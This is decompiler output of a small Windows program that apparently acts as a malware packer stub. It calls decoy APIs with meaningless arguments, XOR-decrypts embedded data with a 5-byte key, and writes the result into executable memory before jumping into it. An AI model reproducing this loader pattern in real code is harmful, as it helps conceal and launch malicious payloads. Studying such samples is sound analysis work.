/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_13101000(_BYTE *, int, int, _DWORD *, unsigned int, int);
// int __userpurge start@<eax>(struct _EXPLICIT_ACCESS_A pExplicitAccess);
// int BaseDumpAppcompatCache(void); weak
// int BaseInitAppcompatCacheSupport(void); weak

//-------------------------------------------------------------------------
// Data declarations

// extern HRESULT (__stdcall *SafeArrayGetUBound)(SAFEARRAY *psa, UINT nDim, LONG *plUbound);
// extern void (__stdcall *BuildTrusteeWithObjectsAndNameA)(PTRUSTEE_A pTrustee, POBJECTS_AND_NAME_A pObjName, SE_OBJECT_TYPE ObjectType, LPSTR ObjectTypeName, LPSTR InheritedObjectTypeName, LPSTR Name);
// extern void (__stdcall *BuildExplicitAccessWithNameA)(PEXPLICIT_ACCESS_A pExplicitAccess, LPSTR pTrusteeName, DWORD AccessPermissions, ACCESS_MODE AccessMode, DWORD Inheritance);
// extern BOOL (__stdcall *AdjustTokenGroups)(HANDLE TokenHandle, BOOL ResetToDefault, PTOKEN_GROUPS NewState, DWORD BufferLength, PTOKEN_GROUPS PreviousState, PDWORD ReturnLength);
// extern ULONG (__stdcall *ControlTraceA)(TRACEHANDLE TraceHandle, LPCSTR InstanceName, PEVENT_TRACE_PROPERTIES Properties, ULONG ControlCode);
// extern BOOL (__stdcall *AddAccessDeniedAce)(PACL pAcl, DWORD dwAceRevision, DWORD AccessMask, PSID pSid);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern UINT (__stdcall *SetErrorMode)(UINT uMode);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);


//----- (13101000) --------------------------------------------------------
int __cdecl sub_13101000(_BYTE *a1, int a2, int a3, _DWORD *a4, unsigned int a5, int a6)
{
  int result; // eax
  int v8; // edi
  __int16 v9; // [esp+8h] [ebp-4h]
  _BYTE *i; // [esp+18h] [ebp+Ch]

  *a4 = a3;
  v9 = a5 % 5;
  result = a5 + a2;
  for ( i = (_BYTE *)(a5 + a2); a3--; ++i )
  {
    v8 = *(unsigned __int8 *)(a6 + v9);
    result = v8 ^ (char)*i;
    *a1 = v8 ^ *i;
    LOWORD(result) = ++v9;
    if ( v9 == 5 )
    {
      result = 0;
      v9 = 0;
    }
    ++a1;
  }
  return result;
}

//----- (1310109B) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __userpurge start@<eax>(struct _EXPLICIT_ACCESS_A pExplicitAccess)
{
  unsigned int v2; // [esp+0h] [ebp-238Ch]
  _BYTE *v3; // [esp+8h] [ebp-2384h] BYREF
  unsigned int v4; // [esp+Ch] [ebp-2380h]
  _BYTE *v5; // [esp+2120h] [ebp-26Ch]
  _BYTE *v6; // [esp+2128h] [ebp-264h]
  unsigned int v7; // [esp+212Ch] [ebp-260h]
  _BYTE *v8; // [esp+2130h] [ebp-25Ch]
  int v9; // [esp+2134h] [ebp-258h] BYREF
  int v10[6]; // [esp+2138h] [ebp-254h] BYREF
  int *UBound; // [esp+2150h] [ebp-23Ch]
  int v12; // [esp+2154h] [ebp-238h] BYREF
  int v13; // [esp+2158h] [ebp-234h] BYREF
  char v14[520]; // [esp+215Ch] [ebp-230h] BYREF
  unsigned int v15; // [esp+2364h] [ebp-28h]
  void **v16; // [esp+2368h] [ebp-24h] BYREF
  int *v17; // [esp+236Ch] [ebp-20h]
  HMODULE ModuleHandleA; // [esp+2370h] [ebp-1Ch]
  _BYTE *v19; // [esp+2374h] [ebp-18h] BYREF
  int v20; // [esp+2378h] [ebp-14h]
  int v21; // [esp+237Ch] [ebp-10h] BYREF
  int v22; // [esp+2380h] [ebp-Ch] BYREF
  _BYTE *v23; // [esp+2384h] [ebp-8h]
  int v24; // [esp+2388h] [ebp-4h]
  void *retaddr; // [esp+2390h] [ebp+4h] BYREF

  v14[3] = -75;
  AddAccessDeniedAce((PACL)0x2800000, 0x4A00000u, 0x2600u, 0);
  UBound = (int *)SafeArrayGetUBound(0, 0x28C0000u, (LONG *)0x900);
  BuildExplicitAccessWithNameA(&pExplicitAccess, (LPSTR)0x10000, 0xE00000u, NOT_USED_ACCESS, 0x800u);
  v14[0] = 24;
  BaseInitAppcompatCacheSupport();
  v14[1] = 67;
  v14[4] = -19;
  UBound = (int *)((char *)UBound - 1828053079);
  v12 = *UBound;
  sub_13101000(&v12, (int)&v12, 4, &v22, 0, (int)v14);
  SetErrorMode(0xBC0u);
  v16 = &retaddr;
  v14[2] = 28;
  BaseInitAppcompatCacheSupport();
  v10[0] = UBound[1];
  sub_13101000(v10, (int)&v9, 4, &v22, 4u, (int)v14);
  v21 = UBound[2];
  BaseDumpAppcompatCache();
  sub_13101000(&v21, (int)&v19, 4, &v22, 8u, (int)v14);
  v17 = UBound + 3;
  ModuleHandleA = GetModuleHandleA(0);
  v10[1] = (int)(ModuleHandleA + 1024);
  v2 = 12;
  AdjustTokenGroups(0, 0, (PTOKEN_GROUPS)0x4400, 0x80000000, (PTOKEN_GROUPS)0x78000000, 0);
  ControlTraceA(0x11090000000ui64, (LPCSTR)0xB200000, 0, 0x188u);
  BuildTrusteeWithObjectsAndNameA(
    (PTRUSTEE_A)&pExplicitAccess,
    (POBJECTS_AND_NAME_A)&pExplicitAccess,
    (SE_OBJECT_TYPE)638976,
    0,
    (LPSTR)0xC000000,
    (LPSTR)0x10C0);
  v19 = (_BYTE *)*v17;
  sub_13101000(&v19, (int)&v16, 4, &v22, 0xCu, (int)v14);
  v19 = &v19[(_DWORD)ModuleHandleA];
  v2 = 16;
  v3 = (_BYTE *)*++v17;
  sub_13101000(&v3, (int)(&v3 - 4), 4, &v22, 0x10u, (int)v14);
  v2 += 4;
  ++v17;
  v15 = 8 * v21 + 12;
  v8 = VirtualAlloc(0, v12 + v10[0] + v15, 0x3000u, 0x40u);
  v23 = &v19[v15];
  v4 = v15;
  v7 = v15;
  v24 = 0;
  v20 = 0;
  while ( 1 )
  {
    if ( (_BYTE *)v7 != v3 )
      goto LABEL_5;
    if ( ++v24 == v21 )
      break;
    v19 = (_BYTE *)*v17;
    sub_13101000(&v19, (int)&(&v19)[v2 / 0xFFFFFFFC], 4, &v22, v2, (int)v14);
    v19 = &v19[(_DWORD)ModuleHandleA];
    v2 += 4;
    v3 = (_BYTE *)*++v17;
    sub_13101000(&v3, (int)&(&v3)[v2 / 0xFFFFFFFC], 4, &v22, v2, (int)v14);
    v2 += 4;
    ++v17;
    v7 = 0;
    v23 = v19;
LABEL_5:
    v8[v20++] = *v23++;
    ++v7;
    ++v4;
  }
  sub_13101000(v8, (int)&v8[-v15], v10[0], &v13, v15, (int)v14);
  v5 = v8 + 3920;
  v6 = v8 + 3920;
  return ((int (__stdcall *)(_BYTE *, _BYTE *, int, int, char *, void **))(v8 + 3920))(
           &v8[v10[0]],
           v8,
           v12,
           v10[0],
           v14,
           v16);
}
// 1310109B: could not find valid save-restore pair for ebx
// 1310109B: could not find valid save-restore pair for esi
// 131012E9: bad sp value at call
// 13101422: bad sp value at call
// 13110328: using guessed type int BaseDumpAppcompatCache(void);
// 13110344: using guessed type int BaseInitAppcompatCacheSupport(void);

// nfuncs=2 queued=2 decompiled=2 lumina nreq=0 worse=0 better=0
// ALL OK, 2 function(s) have been successfully decompiled
